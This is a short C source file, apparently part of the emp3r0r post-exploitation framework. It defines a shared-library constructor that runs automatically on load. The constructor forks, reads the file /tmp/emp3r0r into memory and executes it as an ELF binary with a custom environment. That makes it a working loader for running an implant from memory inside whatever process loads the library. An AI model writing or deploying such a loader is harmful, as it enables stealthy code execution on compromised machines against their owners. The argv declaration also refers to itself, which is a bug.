#include <sys/types.h>
#include <unistd.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

#include "elf.h"

void __attribute__((constructor)) initLibrary(void)
{
    pid_t child = fork();
    if (child == 0) {
        puts("In child process");
        FILE* f = fopen("/tmp/emp3r0r", "rb");

        fseek(f, 0, SEEK_END);
        int size = ftell(f);

        fseek(f, 0L, SEEK_SET);

        char* buf = malloc(size);
        fread(buf, size, 1, f);

        // Run the ELF
        char* argv[] = { argv[0], NULL };
        char* envv[] = { "PATH=/bin:/usr/bin:/sbin:/usr/sbin:/tmp/emp3r0r/bin-aksdfvmvmsdkg", "HOME=/tmp", NULL };
        elf_run(buf, argv, envv);
    }
}

void __attribute__((destructor)) cleanUpLibrary(void) { }
